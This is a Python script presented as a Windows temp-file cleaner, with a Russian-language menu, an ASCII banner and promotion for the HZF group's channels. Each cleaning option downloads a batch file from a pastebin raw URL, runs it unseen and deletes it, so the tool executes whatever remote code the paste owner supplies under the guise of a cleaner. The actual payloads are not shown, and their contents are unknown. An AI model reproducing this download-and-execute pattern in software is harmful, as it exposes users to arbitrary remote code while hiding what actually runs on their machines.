from os import system
from sys import platform
from termcolor import colored
from msvcrt import getch
from requests import get

def usertemp():
    system("cls")
    f=open(r'usertempgo.bat', "wb")
    ufr = get("https://pastebin.com/raw/DwAb11Uv")
    f.write(ufr.content)
    f.close()
    system("usertempgo.bat")
    system("del /Q usertempgo.bat")
    system("cls")
    print("Очистка прошла успешно!\n\n" + colored("Нажмите ENTER для выхода в главное меню", "yellow"))
    input()

def systemtempgo():
    system("cls")
    f=open(r'systemtempgo.bat', "wb")
    ufr = get("https://pastebin.com/raw/TRPdz2fZ")
    f.write(ufr.content)
    f.close()
    system("systemtempgo.bat")
    system("del /Q systemtempgo.bat")
    system("cls")
    print("Очистка прошла успешно!\n\n" + colored("Нажмите ENTER для выхода в главное меню", "yellow"))
    input()

def winupdgo():
    system("cls")
    f=open(r'winupdgo.bat', "wb")
    ufr = get("https://pastebin.com/raw/FJGPQVhZ")
    f.write(ufr.content)
    f.close()
    system("winupdgo.bat")
    system("del /Q winupdgo.bat")
    system("cls")
    print("Очистка прошла успешно!\n\n" + colored("Нажмите ENTER для выхода в главное меню", "yellow"))
    input()

def info():
    global banner
    global banner2
    global banner3
    global banner4
    global banner5
    print(banner + "\n" + banner2 + "\n" + banner3 + "\n" + banner4 + "\n" + banner5 + "\n" + "\nАвтор данной утилиты не несет никакой ответственности за проделлание вами действия, все продукт команды HZF предостовляются только в ознакомительных целях!\n\n" + colored("Нажмите ENTER для выхода в главное меню", "yellow"))
    input()

while True:
    if platform == "win32":
        system('cls')
        banner = ("\n" * 100) + colored("""
██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗     ██████╗██╗     ███████╗ █████╗ ███╗   ██╗███████╗██████╗ 
██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝    ██╔════╝██║     ██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗    ██║     ██║     █████╗  ███████║██╔██╗ ██║█████╗  ██████╔╝
██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║    ██║     ██║     ██╔══╝  ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║    ╚██████╗███████╗███████╗██║  ██║██║ ╚████║███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝     ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
        """, "green")
        banner2 = colored("[", "blue")+"Developers      :"+colored("HZF", "green")
        banner3 = colored("[", "blue")+"Telegram Channel:"+colored("@hzfnews", "cyan")+colored("              <-- Подпишись!", "green")
        banner4 = colored("[", "blue")+"YouTube Channel :"+colored("youtube.com/c/HZFYT", "cyan")+colored("   <-- Подпишись!", "green")
        banner5 = colored("[", "blue")+"VK              :"+colored("vk.com/hzforum1", "cyan")+colored("       <-- Подпишись!", "green")+"\n"

        print(banner)
        print(banner2)
        print(banner3)
        print(banner4)
        print(banner5)
        menu = input(colored("1 ", "cyan") + "- Очистить Temp в директории Пользователя\n" + colored("2 ", "cyan") + "- Очистить Temp в директории Windows\n" + colored("3 ", "cyan") + "- Очистить остаточные файлы после обновлений" + "\n\n" + colored("99 ", "cyan") + "- Важная информация!\n\n" + colored("0 ", "cyan") + "- Выход\n")
        if menu == "1": usertemp()
        if menu == "2": systemtempgo()
        if menu == "3": winupdgo()
        if menu == "99": info()
        if menu == "0": exit()

    elif platform == "linux" or platform == "linux2" or platform == "unix":
        system('clear')
        print("Данная утилита поддерживает только OC Microsoft Windows\n\n" + colored("Нажмите ENTER для выхода из утилиты", "yellow"))
        getch()
        exit()